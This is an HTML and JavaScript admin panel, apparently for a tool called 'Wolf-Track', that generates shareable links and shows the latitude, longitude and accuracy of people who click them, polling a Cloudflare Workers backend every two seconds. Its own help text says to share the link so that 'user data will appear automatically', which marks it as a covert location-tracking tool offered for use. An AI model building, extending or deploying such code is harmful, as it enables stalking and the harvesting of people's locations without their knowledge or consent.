<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Wolf-Track Admin</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui, -apple-system, BlinkMacSystemFont;
  background:#2b2b2b;
  display:flex;
  justify-content:center;
  padding:40px 0;
}

/* PHONE FRAME */
.app{
  width:360px;
  background:#f4f6f8;
  border-radius:18px;
  overflow:hidden;
}

/* HEADER */
.header{
  height:140px;
  background:linear-gradient(180deg,#3b82f6,#2563eb);
  position:relative;
}
.header::after{
  content:"";
  position:absolute;
  bottom:-30px;
  left:0;
  width:100%;
  height:60px;
  background:#f4f6f8;
  border-top-left-radius:50%;
  border-top-right-radius:50%;
}

/* LOGO */
.logo{
  position:absolute;
  bottom:-40px;
  left:50%;
  transform:translateX(-50%);
  background:#fff;
  width:90px;
  height:90px;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  box-shadow:0 6px 14px rgba(0,0,0,.15);
  font-weight:700;
  color:#2563eb;
}

/* MAIN CARD */
.card{
  background:#fff;
  margin:60px 16px 16px;
  padding:20px;
  border-radius:16px;
  box-shadow:0 6px 18px rgba(0,0,0,.08);
}

/* BUTTONS */
button{
  width:100%;
  background:#2563eb;
  color:#fff;
  border:none;
  padding:12px;
  font-weight:600;
  border-radius:999px;
  cursor:pointer;
}
button:active{transform:scale(.98)}

input{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:1px solid #d1d5db;
  margin-top:10px;
}

/* INFO SECTIONS */
.section{
  margin-top:14px;
  padding:14px;
  border-radius:14px;
  border:1px solid #e5e7eb;
}

.section h4{
  margin:0 0 8px;
  font-size:14px;
  color:#2563eb;
  display:flex;
  align-items:center;
  gap:6px;
}

.status{
  display:flex;
  justify-content:space-between;
  font-size:13px;
}
.dot{
  width:8px;
  height:8px;
  border-radius:50%;
  background:#22c55e;
  display:inline-block;
}

/* MAP PLACEHOLDER */
.map{
  height:100px;
  background:#e5e7eb;
  border-radius:12px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#9ca3af;
  font-weight:600;
}

/* USERS */
.user{
  margin-top:10px;
  padding:10px;
  border-radius:10px;
  border:1px solid #e5e7eb;
  font-size:13px;
}

.loader{
  display:none;
  text-align:center;
  margin:10px 0;
  font-weight:600;
}
</style>
</head>

<body>

<div class="app">

  <div class="header">
    <div class="logo">WOLF</div>
  </div>

  <!-- LOGIN -->
  <div class="card" id="loginBox">
    <h3 style="text-align:center;margin-top:0">Admin Login</h3>
    <input id="pass" type="password" placeholder="Enter your key here...">
    <button onclick="login()">ENTER</button>
  </div>

  <!-- PANEL -->
  <div class="card" id="panel" style="display:none">

    <button onclick="generate()">GENERATE LINK</button>
    <input id="link" placeholder="your link is here" readonly>

    <div class="loader" id="loader">Loading…</div>

    <div class="section">
      <h4>👤 User info</h4>
      <div class="status">
        <span>link clicked</span><span class="dot"></span>
      </div>
      <div class="status">
        <span>active</span><span class="dot"></span>
      </div>
    </div>

    <div class="section">
      <h4>📍 User location</h4>
      <div class="map">MAP HERE</div>
    </div>

    <div class="section">
      <h4>❓ How to use?</h4>
      <p style="font-size:12px;color:#6b7280;margin:0">
        Generate a link and share it. User data will appear automatically.
      </p>
    </div>

    <div id="users"></div>
  </div>

</div>

<script>
const API="https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
let sessionId=null;

function login(){
  fetch(API+"/login",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({password:pass.value})
  })
  .then(r=>r.json())
  .then(d=>{
    sessionId=d.sessionId;
    loginBox.style.display="none";
    panel.style.display="block";
    load();
  })
  .catch(()=>alert("Wrong password"));
}

function generate(){
  loader.style.display="block";
  fetch(API+"/create-link",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sessionId})
  })
  .then(r=>r.json())
  .then(d=>{
    link.value=d.link;
    loader.style.display="none";
  });
}

async function load(){
  const r=await fetch(API+"/admin-data");
  const data=await r.json();
  users.innerHTML="";
  for(const t in data){
    const u=data[t];
    users.innerHTML+=`
      <div class="user">
        <b>${t}</b><br>
        ${u.lat}, ${u.lng}<br>
        Accuracy: ${u.acc}m
      </div>`;
  }
}
setInterval(load,2000);
</script>

</body>
</html>
